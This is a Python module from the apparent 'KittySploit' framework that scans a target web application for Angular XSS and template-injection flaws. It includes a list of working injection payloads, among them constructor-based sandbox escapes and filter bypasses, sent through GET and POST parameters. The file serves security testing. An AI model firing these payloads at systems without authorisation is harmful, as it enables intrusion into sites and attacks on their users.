#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *
from lib.protocols.http.http_client import Http_client
import re
import urllib.parse


class Module(Auxiliary, Http_client):

    __info__ = {
        'name': 'Angular XSS Scanner',
        'description': 'Scans for Angular-specific XSS vulnerabilities including template injection, expression injection, and unsafe binding vulnerabilities',
        'author': 'KittySploit Team',
        'tags': ['web', 'angular', 'xss', 'scanner', 'security', 'injection'],
        'references': [
            'https://owasp.org/www-community/attacks/xss/',
            'https://angular.io/guide/security',
            'https://portswigger.net/web-security/cross-site-scripting',
        ]
    }

    # Angular XSS payloads
    ANGULAR_PAYLOADS = [
        # Template injection payloads
        '{{constructor.constructor("alert(1)")()}}',
        '{{$eval.constructor("alert(1)")()}}',
        '{{$new.constructor("alert(1)")()}}',
        '{{$get.constructor("alert(1)")()}}',
        '{{$apply.constructor("alert(1)")()}}',
        '{{$compile.constructor("alert(1)")()}}',
        '{{constructor.constructor("return process")()}}',
        '{{$eval("constructor.constructor(\'return process\')()")}}',
        
        # Expression injection payloads
        '{{7*7}}',
        '{{7*7}}={{49}}',
        '{{1+1}}',
        '{{constructor}}',
        '{{$eval}}',
        '{{$new}}',
        '{{$get}}',
        '{{$apply}}',
        '{{$compile}}',
        
        # AngularJS specific
        '{{$on.constructor("alert(1)")()}}',
        '{{$watch.constructor("alert(1)")()}}',
        '{{$root.constructor("alert(1)")()}}',
        '{{$scope.constructor("alert(1)")()}}',
        
        # Angular 2+ specific
        '{{constructor.constructor("return this")().process}}',
        '{{constructor.constructor("return global")().process}}',
        
        # Bypass filters
        '{{constructor["constructor"]("alert(1)")()}}',
        '{{constructor[`constructor`]("alert(1)")()}}',
        '{{constructor.constructor`alert(1)```()}}',
    ]

    # Parameter names commonly used with Angular
    ANGULAR_PARAMS = [
        'q', 'query', 'search', 'filter', 'sort', 'order',
        'name', 'value', 'id', 'key', 'data', 'input',
        'template', 'expression', 'eval', 'compile',
        'callback', 'jsonp', 'format', 'output'
    ]

    def check(self):
        """
        Check if the target is accessible and might be using Angular
        """
        try:
            response = self.http_request(method="GET", path="/")
            if response:
                # Check for Angular indicators
                content = response.text.lower()
                if any(indicator in content for indicator in ['ng-app', 'angular', '[ng-', '*ng-', 'angularjs']):
                    return True
                # Check headers
                headers = str(response.headers).lower()
                if 'angular' in headers:
                    return True
                # Even if not detected, continue scanning
                return True
            return False
        except Exception as e:
            return False

    def detect_angular_version(self):
        """
        Detect Angular version from response
        """
        try:
            response = self.http_request(method="GET", path="/")
            if not response:
                return None
            
            content = response.text
            
            # Check for Angular version in script tags
            version_match = re.search(r'angular[\.-]?(\d+\.\d+\.\d+)', content, re.IGNORECASE)
            if version_match:
                return version_match.group(1)
            
            # Check for ng-version attribute
            ng_version_match = re.search(r'ng-version=["\']([^"\']+)["\']', content, re.IGNORECASE)
            if ng_version_match:
                return ng_version_match.group(1)
            
            # Check for AngularJS
            if 'angularjs' in content.lower() or 'ng-app' in content.lower():
                return 'AngularJS (1.x)'
            
            # Check for Angular 2+
            if 'angular' in content.lower() and ('[ng-' in content or '*ng-' in content):
                return 'Angular 2+'
            
            return None
        except Exception as e:
            print_debug(f"Error detecting Angular version: {str(e)}")
            return None

    def test_xss_payload(self, payload, param_name='q'):
        """
        Test an XSS payload against a parameter
        
        Args:
            payload: The XSS payload to test
            param_name: Parameter name to inject into
            
        Returns:
            dict: Test results
        """
        try:
            # URL encode the payload
            encoded_payload = urllib.parse.quote(payload)
            
            # Test in query parameter
            test_path = f"/?{param_name}={encoded_payload}"
            response = self.http_request(
                method="GET",
                path=test_path,
                allow_redirects=False
            )
            
            if not response:
                return {'payload': payload, 'vulnerable': False, 'error': 'No response'}
            
            # Check if payload is reflected
            is_reflected = payload in response.text or encoded_payload in response.text
            
            # Check for Angular expression evaluation
            is_evaluated = False
            if '{{' in payload and '}}' in payload:
                # Check if expression was evaluated (e.g., {{7*7}} becomes 49)
                expr_match = re.search(r'\{\{(\d+)\*(\d+)\}\}', payload)
                if expr_match:
                    expected_result = str(int(expr_match.group(1)) * int(expr_match.group(2)))
                    if expected_result in response.text:
                        is_evaluated = True
            
            # Check for JavaScript execution indicators
            js_indicators = ['<script', 'javascript:', 'onerror=', 'onload=', 'alert(']
            has_js_indicators = any(indicator in response.text.lower() for indicator in js_indicators)
            
            vulnerable = is_reflected or is_evaluated
            
            return {
                'payload': payload,
                'param': param_name,
                'path': test_path,
                'vulnerable': vulnerable,
                'is_reflected': is_reflected,
                'is_evaluated': is_evaluated,
                'has_js_indicators': has_js_indicators,
                'status_code': response.status_code,
                'response_length': len(response.text)
            }
            
        except Exception as e:
            return {
                'payload': payload,
                'param': param_name,
                'vulnerable': False,
                'error': str(e)
            }

    def test_post_xss(self, payload, param_name='data'):
        """
        Test XSS payload via POST request
        
        Args:
            payload: The XSS payload to test
            param_name: Parameter name to inject into
            
        Returns:
            dict: Test results
        """
        try:
            # Test POST with form data
            post_data = {param_name: payload}
            response = self.http_request(
                method="POST",
                path="/",
                data=post_data
            )
            
            if not response:
                return {'payload': payload, 'vulnerable': False, 'error': 'No response'}
            
            # Check if payload is reflected
            is_reflected = payload in response.text
            
            return {
                'payload': payload,
                'param': param_name,
                'method': 'POST',
                'vulnerable': is_reflected,
                'is_reflected': is_reflected,
                'status_code': response.status_code
            }
            
        except Exception as e:
            return {
                'payload': payload,
                'param': param_name,
                'vulnerable': False,
                'error': str(e)
            }

    def run(self):
        """
        Execute the Angular XSS scan
        """
        self.vulnerabilities = []
        self.test_results = []
        
        print_status("Starting Angular XSS scan...")
        print_info(f"Target: {self.target}")
        print_info("")
        
        # Detect Angular version
        print_status("Detecting Angular version...")
        version = self.detect_angular_version()
        if version:
            print_success(f"Angular version detected: {version}")
        else:
            print_warning("Could not detect Angular version")
            print_info("Continuing with generic Angular XSS tests...")
        print_info("")
        
        # Test GET parameters
        print_status("Testing GET parameters for XSS vulnerabilities...")
        print_info("")
        
        for param in self.ANGULAR_PARAMS:
            print_info(f"Testing parameter: {param}")
            
            for i, payload in enumerate(self.ANGULAR_PAYLOADS[:10], 1):  # Test first 10 payloads per param
                result = self.test_xss_payload(payload, param)
                self.test_results.append(result)
                
                if result.get('vulnerable'):
                    print_success(f"  [!] Potential XSS found with payload: {payload[:50]}...")
                    print_info(f"      Parameter: {param}")
                    print_info(f"      Reflected: {result.get('is_reflected', False)}")
                    print_info(f"      Evaluated: {result.get('is_evaluated', False)}")
                    self.vulnerabilities.append(result)
        
        print_info("")
        
        # Test POST parameters
        print_status("Testing POST parameters for XSS vulnerabilities...")
        print_info("")
        
        for param in self.ANGULAR_PARAMS[:5]:  # Test first 5 params via POST
            print_info(f"Testing POST parameter: {param}")
            
            for payload in self.ANGULAR_PAYLOADS[:5]:  # Test first 5 payloads
                result = self.test_post_xss(payload, param)
                self.test_results.append(result)
                
                if result.get('vulnerable'):
                    print_success(f"  [!] Potential XSS found (POST) with payload: {payload[:50]}...")
                    print_info(f"      Parameter: {param}")
                    self.vulnerabilities.append(result)
        
        print_info("")
        
        # Summary
        print_status("=" * 60)
        print_status("Angular XSS Scan Summary")
        print_status("=" * 60)
        
        if version:
            print_info(f"Angular Version: {version}")
        else:
            print_warning("Angular Version: Not detected")
        
        print_info(f"Total tests performed: {len(self.test_results)}")
        print_info(f"Vulnerabilities found: {len(self.vulnerabilities)}")
        print_status("=" * 60)
        print_info("")
        
        if self.vulnerabilities:
            print_success("Vulnerabilities detected:")
            print_info("")
            
            table_data = []
            for vuln in self.vulnerabilities[:20]:  # Show first 20
                payload_short = vuln['payload'][:40] + '...' if len(vuln['payload']) > 40 else vuln['payload']
                table_data.append([
                    vuln.get('param', 'N/A'),
                    vuln.get('method', 'GET'),
                    payload_short,
                    'Yes' if vuln.get('is_evaluated') else ('Reflected' if vuln.get('is_reflected') else 'No')
                ])
            
            print_table(['Parameter', 'Method', 'Payload', 'Status'], table_data)
        else:
            print_info("No Angular XSS vulnerabilities detected.")
        
        return True
